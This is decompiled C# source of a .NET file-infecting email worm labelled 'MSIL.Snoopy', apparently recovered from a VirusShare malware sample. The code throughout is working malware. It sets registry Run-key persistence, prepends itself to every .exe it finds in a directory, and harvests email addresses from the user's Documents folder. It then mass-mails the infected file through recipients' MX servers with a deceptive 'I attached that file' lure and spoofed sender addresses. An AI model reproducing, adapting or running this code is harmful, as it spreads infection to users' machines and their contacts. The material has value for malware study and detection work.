// Decompiled with JetBrains decompiler
// Type: Snoopy.Snoopy
// Assembly: Snoopy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 225FC345-1E6A-4DC3-B737-1C6B8FCBFB0B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Virus.MSIL.Small.h-23076d3d679e7978b958427852298ee1d86e790a9898976bd84186486feef740.exe

using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Snoopy
{
  internal class Snoopy
  {
    private string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
    private string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    private ArrayList arrEmails = new ArrayList();
    private ArrayList arInfect = new ArrayList();

    [DllImport("dnsapi", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int Dns(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string strName,
      int intType,
      int intOpt,
      int intServer,
      ref IntPtr pResult,
      int intReserved);

    public bool CheckReg()
    {
      string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
      if (!((string) Registry.GetValue(keyName, nameof (Snoopy), (object) nameof (Snoopy)) == nameof (Snoopy)))
        return false;
      Registry.SetValue(keyName, nameof (Snoopy), (object) this.me);
      return true;
    }

    public void Message()
    {
      int num = (int) MessageBox.Show("Infected with MSIL.Snoopy", nameof (Snoopy));
    }

    public void Replicate(string dir)
    {
      FileStream input1 = new FileStream(this.me, FileMode.Open, FileAccess.Read);
      BinaryReader binaryReader1 = new BinaryReader((Stream) input1);
      byte[] numArray1 = new byte[input1.Length];
      for (int index = 0; index < numArray1.Length; ++index)
        numArray1[index] = binaryReader1.ReadByte();
      input1.Close();
      binaryReader1.Close();
      string[] files = Directory.GetFiles(dir, "*.exe");
      for (int index1 = 0; index1 < files.Length; ++index1)
      {
        FileStream input2 = new FileStream(files[index1], FileMode.Open, FileAccess.Read);
        BinaryReader binaryReader2 = new BinaryReader((Stream) input2);
        byte[] numArray2 = new byte[input2.Length];
        for (int index2 = 0; index2 < numArray2.Length; ++index2)
          numArray2[index2] = binaryReader2.ReadByte();
        binaryReader2.Close();
        input2.Close();
        if (numArray2[60] != (byte) 128)
        {
          BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(files[index1], FileMode.Open, FileAccess.Write));
          for (int index3 = 0; index3 < numArray1.Length; ++index3)
            binaryWriter.BaseStream.WriteByte(numArray1[index3]);
          for (int index4 = 0; index4 < numArray2.Length; ++index4)
            binaryWriter.BaseStream.WriteByte(numArray2[index4]);
          binaryWriter.Close();
          input2.Close();
          this.arInfect.Add((object) files[index1]);
        }
      }
      FileInfo fileInfo = new FileInfo(this.me);
      if ((int) fileInfo.Length - 20480 <= 0)
      {
        int num = (int) MessageBox.Show("Not a valid win32 program", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        Application.Exit();
      }
      else
      {
        try
        {
          string str = (DateTime.Now.Hour + DateTime.Now.Second + DateTime.Now.Minute).ToString() + ".exe";
          FileStream fileStream = new FileStream(str, FileMode.CreateNew);
          File.SetAttributes(str, FileAttributes.Hidden);
          for (int index = 20480; (long) index < fileInfo.Length; ++index)
            fileStream.WriteByte(numArray1[index]);
          fileStream.Close();
          try
          {
            Process.Start(str).WaitForExit();
          }
          catch (Exception ex)
          {
            int num = (int) MessageBox.Show("This file is corrupt", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
          File.Delete(str);
          Application.Exit();
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void Send()
    {
      this.arrEmails = this.SearchEmails(this.myDocs, "*.*");
      ArrayList arrEmails = this.arrEmails;
      arrEmails.Reverse();
      string file = this.GetFile();
      if (!(file != "") || this.arrEmails.Count <= 0)
        return;
      Attachment attachment = new Attachment(file);
      IEnumerator enumerator = this.arrEmails.GetEnumerator();
      ArrayList arrayList = new ArrayList();
      while (enumerator.MoveNext())
      {
        string address1 = Convert.ToString(enumerator.Current);
        foreach (object obj in arrEmails)
        {
          string address2 = Convert.ToString(obj);
          if (address1 != address2 && !arrayList.Contains((object) address1))
          {
            arrayList.Add((object) address1);
            MailAddress to = new MailAddress(address1);
            MailMessage message = new MailMessage(new MailAddress(address2), to);
            message.Subject = "Hey";
            message.Body = "Hey hows it going? I attached that file you were asking about. Let me know if it worKs for you or not. I'm not sure what I'm going to do the tommorow maybe get some coffee and do some shopping. Well give me a call later okay?";
            message.Attachments.Add(attachment);
            string mxRecords = this.GetMXRecords(address1.Substring(address1.IndexOf("@")).Replace("@", string.Empty));
            try
            {
              new SmtpClient(mxRecords).Send(message);
            }
            catch (Exception ex)
            {
            }
          }
        }
      }
      attachment.Dispose();
    }

    private ArrayList SearchEmails(string dir, string fileType)
    {
      ArrayList arrayList = new ArrayList();
      foreach (FileInfo file in new DirectoryInfo(dir).GetFiles(fileType))
      {
        Console.WriteLine(file.FullName);
        StreamReader streamReader = File.OpenText(file.FullName);
        string InputData;
        while ((InputData = streamReader.ReadLine()) != null)
        {
          string addr = this.ExtractAddr(InputData);
          if (addr != "" && !arrayList.Contains((object) addr) && new Regex("^([a-zA-Z0-9_\\-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([a-zA-Z0-9\\-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$").IsMatch(addr) && !arrayList.Contains((object) addr))
            arrayList.Add((object) addr);
        }
      }
      return arrayList;
    }

    public string ExtractAddr(string InputData)
    {
      int num1 = InputData.IndexOf("@", 0) + 1;
      int num2 = 1;
      int num3 = InputData.Length;
      string addr = "";
      if (num1 == 0)
        return addr;
      for (int index = num1 - 1; index >= 1; --index)
      {
        string str = InputData.Substring(index - 1, 1);
        if (str == " " | str == "<" | str == "(" | str == ":" | str == "," | str == "[")
        {
          num2 = index + 1;
          break;
        }
      }
      for (int index = num1 + 1; index <= InputData.Length; ++index)
      {
        string str = InputData.Substring(index - 1, 1);
        if (str == " " | str == ">" | str == ")" | str == ":" | str == "," | str == "]")
        {
          num3 = index - 1;
          break;
        }
      }
      return Regex.Replace(InputData.Substring(num2 - 1, num3 - num2 + 1), "<(.|\\n)*?>", string.Empty).Replace("&nbsp;", "").Replace(" ", "").Replace("\"", "");
    }

    private string GetFile()
    {
      string file = "";
      if (this.arInfect.Count > 0)
      {
        foreach (object obj in this.arInfect)
          file = Convert.ToString(obj);
      }
      return file;
    }

    public string GetMXRecords(string host)
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      int num = Snoopy.Snoopy.Dns(ref host, 15, 8, 0, ref zero1, 0);
      string mxRecords = "";
      Snoopy.Snoopy.STRMX structure;
      if (num != 0)
      {
        mxRecords = host;
      }
      else
      {
        for (IntPtr ptr = zero1; !ptr.Equals((object) IntPtr.Zero); ptr = structure.pNext)
        {
          structure = (Snoopy.Snoopy.STRMX) Marshal.PtrToStructure(ptr, typeof (Snoopy.Snoopy.STRMX));
          if (structure.sType == (short) 15)
          {
            string stringAuto = Marshal.PtrToStringAuto(structure.pNameEx);
            if (stringAuto != "")
              mxRecords = stringAuto;
          }
        }
      }
      return mxRecords;
    }

    private struct STRMX
    {
      public IntPtr pNext;
      public string strName;
      public short sType;
      public int intFlag;
      public int intTTL;
      public int intRes;
      public IntPtr pNameEx;
    }
  }
}
